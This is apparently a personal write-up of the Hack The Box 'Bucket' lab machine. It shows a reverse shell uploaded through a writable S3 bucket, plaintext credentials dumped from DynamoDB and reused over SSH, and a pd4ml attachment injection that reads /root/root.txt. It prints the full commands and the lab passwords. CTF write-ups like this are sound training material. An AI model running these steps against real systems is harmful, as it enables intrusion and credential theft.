---
layout: default
title: BUCKETS
description: by Hack The Box
---

<h3 align="center">
This machine is just wow! So many things learned from this. Before anything else, I would like to give credit to John Hammond and IPPsec's youtube video walkthrough's. After getting a foothold, I could not for the life of me really get lateral grip to gain root access. These two legends pave the way.
</h3>

# Enumeration

1. Nmap scan

   ```
   ┌──(schoon3r㉿nexer)-[~]
   └─$ nmap -A -T4 10.10.10.212 -Pn
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-01 19:15 EST
   Nmap scan report for bucket.htb (10.10.10.212)
   Host is up (0.056s latency).
   Not shown: 998 closed tcp ports (conn-refused)
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey:
   |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
   |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
   |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
   80/tcp open  http    Apache httpd 2.4.41
   |_http-title: Site doesn't have a title (text/html).
   |_http-server-header: Apache/2.4.41 (Ubuntu)
   Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds
   ```

2. I also did a gobuster and ffuf scan for directories but I immediately abandoned it because going in, I already knew this is going to be an AWS bucket (S3), having done FLAWS before hand I sort of am familiar with the AWS CLI now.

3. But for the sake of those new to AWS S3 buckets, if you look at the raw website render (ctrl+u)... you will notice that 3 of the photos of the website is inside an s3 subdomain... which indicates this is hosted in an s3 bucket

4. Another thing (for the beginners), if you just type in 10.10.10.212 into your browser... you might see that it redirects you to a url that it can't resolve. That's because the IP is not public and your regular 8.8.8.8 doesn't know where to resolve that domain name to... so go ahead and manual put this into your /etc/hosts file

# FootHold

5. Since I already have an AWS account and have already configure my AWS CLI from doing the FLAWS challenge... I wont cover how to configure a default credential. If you need to learn how to do it go to the AWS CLI command reference website.

6. First thing I did is to look into the bucket by listing its directory
   ```
   ┌──(schoon3r㉿nexer)-[~]
   └─$ aws s3 ls --endpoint-url http://s3.bucket.htb --region us east-1
   2021-12-01 19:41:03 adserver
   ```
   then I looked into the adserver directory too
   ```
   ┌──(schoon3r㉿nexer)-[~]
   └─$ aws --endpoint-url http://s3.bucket.htb --region us-east-1 s3 ls adserver
                           PRE images/
   2021-12-01 19:47:04     5344 index.html
   ```
7. Now, I know this is a sort of public (in a sense) bucket because I can use the ls command without the owner's user credentials. If I can LS, then I can also CP which one of the other command by AWS CLI - S3.

8. So, what we are gonna do is upload a reverse shell script by PentestMonkey so we can comb through the server

   First let me start a listener

   ```
   nc -nvlp 444
   ```

   Then I download the reverse shell, and change the parameters within the script

   ```
   sudo wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
   ```

   Lastly, I uploaded the file into the bucket... I also renamed the script coz its too long. (run.php)

   ```
   aws --endpoint-url http://s3.bucket.htb --region us-east-1 s3 cp run.php s3://adserver
   ```

   Rabbit hole: you might think it did not work coz your netcat just wont get the shell, but just keep trying... I also had to do it a lot of times every time I try to get the shell. Just be patient.

9. Inside, we find that:

   - we are user 'www-data'
   - there are two users root and roy

10. So from the nmap scan we know SSH is on because port 22 is alive. We have a username so we need a password. Just because I am me, I still tried to SSH to both user using noob passwords like password, admin, root, toor... as you may know... no joy!

11. So now, let's try and enumerate again to see what else we can find. I ran gobuster again but this time I ran it on the s3 subdomain.

    ```
    gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://s3.bucket.htb/
    ```

    I also ran ffuf at the same time as this. Its just a habit now.

    Found these two directories

    ```
    health
    shell
    ```

12. From the browser, going into this directories I quickly saw that bucket is attacked to a service called DynamoDB.
    ```
    ┌──(schoon3r㉿nexer)-[~/HTB/212-Bucket]
    └─$ curl http://s3.bucket.htb/health
    {"services": {"s3": "running", "dynamodb": "running"}}`
    ```
13. As I mentioned, I sort of know a little about AWS already and know how to interact with RDS of AWS. So first thing I did is list the table inside the dynamodb
    ```
    ┌──(schoon3r㉿nexer)-[~/HTB/212-Bucket]
    └─$ aws --endpoint-url http://s3.bucket.htb --region us-east-1 dynamodb list-tables
    {
        "TableNames": [
            "users"
        ]
    }
    ```
14. Boom we have users table. Let's scan what's inside
    ```
    ┌──(schoon3r㉿nexer)-[~/HTB/212-Bucket]
    └─$ aws --endpoint-url http://s3.bucket.htb --region us-east-1 dynamodb scan --table-name users                                                         2 ⨯
    {
        "Items": [
            {
                "password": {
                    "S": "Management@#1@#"
                },
                "username": {
                    "S": "Mgmt"
                }
            },
            {
                "password": {
                    "S": "Welcome123!"
                },
                "username": {
                    "S": "Cloudadm"
                }
            },
            {
                "password": {
                    "S": "n2vM-<_K_Q:.Aa2"
                },
                "username": {
                    "S": "Sysadm"
                }
            }
        ],
        "Count": 3,
        "ScannedCount": 3,
        "ConsumedCapacity": null
    }
    ```
15. Boom! Username and password combos. Because I am simple minded (and I say this coz this is really the very first I did, but other 'legends' of CTF didn't - I guess its because they have 10 million things going on in their mind while mine is full of cob webs)... I tried to use these passwords on the two users I found from our revershell using `su root` and `su roy`. I won't spoil this, but there are only 3 passwords... dont be lazy and try them all on these two usernames. One will work!
16. Since I now know the password and username... I closed my revershell session and pivot into SSH.
17. Once logged in via SSH... didn't take me long to find the user flag which is available in /home/user.txt

# Root

`Important!`
I tried and tried until blood came out of my nose on this one but I got nowhere. So I turned into a walkthrough video by IPPsec and John Hammond. The next steps are credit to their work and not mine. I will not try to explain it like I normally do but I will explain the methods to get to the same results. Please watch their videos because you will get more info from it than reading below.

## Enum

18. Directories available that is of signaficant importance

    ```
    roy@bucket:/$ cd /var/www/bucket-app
    roy@bucket:/var/www/bucket-app$ ls

    composer.json
    composer.lock
    files
    index.php
    pd4ml_demo.jar
    vendor
    ```

19. index.php contains a script that lets you run commands if you can call it from a table in dynamodb
20. Create a table from dynamodb
    ```
    aws --endpoint-url http://s3.bucket.htb --region us-east-1 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
    ```
21. Check if the table is indeed create
    ```
    ┌──(schoon3r㉿nexer)-[~/HTB/212-Bucket]
    └─$ aws --endpoint-url http://s3.bucket.htb --region us-east-1 dynamodb list-tables
    {
        "TableNames": [
            "alerst"
            "users"
        ]
    }
    ```
22. Create a json file to put in the table that was created

    [1] Create file

    ```
    sudo vim ransomware.json
    ```

    File content (shortcut... removed the POC)

    ```
    {
    "title" : {"S" : "Ransomware"},
    "data" : {"S" : "<html><pd4ml:attachment src='file:///root/root.txt' description='attachment sample' icon='Paperclip' />"}
    }
    ```

    [2] Upload the file into the table

    ```
    aws --endpoint-url http://s3.bucket.htb --region us-east-1 dynamodb put-item --table-name alerts --item file://ransomware.json
    ```

    You can verify this using the scan command from Step 14

23. From inside the SSH... call the script by
    ```
    curl --data "action=get_alerts" http://localhost:8000
    ```
24. From your terminal...
    ```
    sshpass -p 'n2vM-<_K_Q:.Aa2' scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf .
    ```
    then
    ```
    evince result.pdf
    ```
    The output will be the root flag!
25. I would like to say it again, the steps from the #ROOT is not my own and came from walkthrough videos of John Hammond (predominantly) and IPPsec. All credit goes to these two legends. My intention is not to plagiarise but to inform others.

26. Also, you will find that the db reverts and deletes the table you've created very quickly... so you have to move quickly to get the root flag.

<br><br>

# Reference

1. https://github.com/pentestmonkey/php-reverse-shell
2. https://www.youtube.com/watch?v=5YweYcXoch8
3. https://www.youtube.com/watch?v=SgWhuTxm2oY
4. https://docs.aws.amazon.com/cli/latest/reference/s3/
5. https://docs.aws.amazon.com/cli/latest/reference/dynamodb/

<br><br>

[back to HOME](./)
